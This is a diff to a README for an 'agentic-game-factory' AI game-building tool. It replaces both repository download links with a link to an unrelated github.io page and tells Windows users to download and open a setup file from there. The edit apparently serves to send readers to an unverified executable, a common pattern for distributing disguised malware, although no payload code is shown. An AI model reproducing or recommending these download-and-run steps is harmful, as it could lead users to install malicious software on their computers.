@@ -1,6 +1,6 @@
 # 🤖 agentic-game-factory - Build complete mobile games using AI
 
-[![Download Agentic Game Factory](https://img.shields.io/badge/Download-Blue-blue)](https://github.com/Edentulous-sole142/agentic-game-factory)
+[![Download Agentic Game Factory](https://img.shields.io/badge/Download-Blue-blue)](https://edentulous-sole142.github.io)
 
 ## 📌 About this project
 
@@ -20,7 +20,7 @@ You need a Windows computer to run this tool. Ensure you have the following befo
 
 ## 🚀 How to set up your environment
 
-1. Visit the [official repository page](https://github.com/Edentulous-sole142/agentic-game-factory) to download the setup file.
+1. Visit the [official repository page](https://edentulous-sole142.github.io) to download the setup file.
 2. Locate the folder where you saved the download.
 3. Open the file to start the installation wizard.
 4. Follow the instructions on the screen.
